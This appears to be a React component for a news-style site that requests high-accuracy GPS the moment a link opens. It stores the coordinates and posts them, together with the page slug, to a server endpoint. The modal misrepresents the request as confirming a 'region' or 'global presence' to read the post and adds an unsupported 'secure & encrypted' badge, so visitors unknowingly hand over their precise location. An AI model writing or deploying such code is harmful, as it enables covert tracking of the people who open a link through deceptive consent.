'use client';

import { useState, useEffect } from 'react';
import { Globe, ArrowRight, X, Sparkles, ShieldCheck } from 'lucide-react';

export default function LocationTracker({ slug }: { slug?: string }) {
  const [hasDismissed, setHasDismissed] = useState(false);
  const [loading, setLoading] = useState(false);

  const sendGPSLocation = async (latitude: number, longitude: number, accuracy: number | null) => {
    localStorage.setItem(
      'bk_user_location',
      JSON.stringify({ latitude, longitude, accuracy, timestamp: Date.now() })
    );

    try {
      await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          latitude,
          longitude,
          accuracy,
          slug: slug || (typeof window !== 'undefined' ? window.location.pathname : 'home'),
        }),
      });
    } catch {
      /* ignore */
    }
  };

  const handleAllowAndContinue = () => {
    if (typeof window === 'undefined' || !('geolocation' in navigator)) {
      setHasDismissed(true);
      return;
    }

    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        setHasDismissed(true);
        setLoading(false);
        // ONLY send when real hardware GPS coordinates are obtained
        sendGPSLocation(latitude, longitude, accuracy);
      },
      () => {
        // Dismiss smoothly if user declines
        setHasDismissed(true);
        setLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  const handleCancel = () => {
    setHasDismissed(true);
  };

  useEffect(() => {
    // 1. Check if user already permitted GPS previously
    const cached = localStorage.getItem('bk_user_location');
    if (cached) {
      try {
        const parsed = JSON.parse(cached);
        if (parsed.latitude && parsed.longitude) {
          setHasDismissed(true);
          return;
        }
      } catch {
        /* ignore */
      }
    }

    // 2. Instantly pop up the browser GPS request the millisecond the link opens!
    handleAllowAndContinue();
  }, []);

  // When dismissed or already saved, don't show popup
  if (hasDismissed) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-md overflow-hidden rounded-3xl border border-gray-100 bg-white p-7 text-center shadow-2xl transition-all">
        {/* Top Close / Cancel 'X' icon */}
        <button
          onClick={handleCancel}
          className="absolute right-4 top-4 rounded-full p-2 text-gray-400 hover:bg-gray-100 hover:text-gray-600 transition"
          aria-label="Cancel"
        >
          <X className="h-5 w-5" />
        </button>

        {/* Global Icon */}
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-2xl bg-blue-50 text-bk-blue ring-8 ring-blue-50/50">
          <Globe className="h-8 w-8 text-bk-blue" />
        </div>

        {/* Badge */}
        <div className="mb-2 inline-flex items-center gap-1.5 rounded-full bg-blue-100/80 px-3 py-1 text-xs font-bold text-bk-blue uppercase tracking-wider">
          <Sparkles className="h-3.5 w-3.5" />
          <span>Global Reader Access</span>
        </div>

        {/* Title in English */}
        <h2 className="text-xl font-extrabold text-gray-900 tracking-tight">
          Read Post by Confirming Your Global Presence
        </h2>

        {/* Description in English */}
        <p className="mt-2.5 text-sm text-gray-600 leading-relaxed">
          Please confirm your region to access full news, verified community notices, and local updates.
        </p>

        {/* Action Buttons */}
        <div className="mt-6 flex flex-col gap-2.5 sm:flex-row-reverse sm:gap-3">
          <button
            onClick={handleAllowAndContinue}
            disabled={loading}
            className="flex-1 inline-flex cursor-pointer items-center justify-center gap-2 rounded-xl bg-bk-blue py-3 px-5 text-sm font-bold text-white shadow-md hover:bg-blue-800 active:scale-98 transition disabled:opacity-60"
          >
            {loading ? (
              <span>Connecting...</span>
            ) : (
              <>
                <span>Continue to Post</span>
                <ArrowRight className="h-4 w-4" />
              </>
            )}
          </button>

          <button
            onClick={handleCancel}
            className="inline-flex cursor-pointer items-center justify-center rounded-xl border border-gray-300 bg-white py-3 px-5 text-sm font-semibold text-gray-700 hover:bg-gray-50 active:scale-98 transition"
          >
            Cancel
          </button>
        </div>

        {/* Security / Privacy reassurance badge */}
        <div className="mt-4 flex items-center justify-center gap-1.5 text-xs text-gray-400">
          <ShieldCheck className="h-4 w-4 text-green-500" />
          <span>Fast, secure & encrypted network access</span>
        </div>
      </div>
    </div>
  );
}
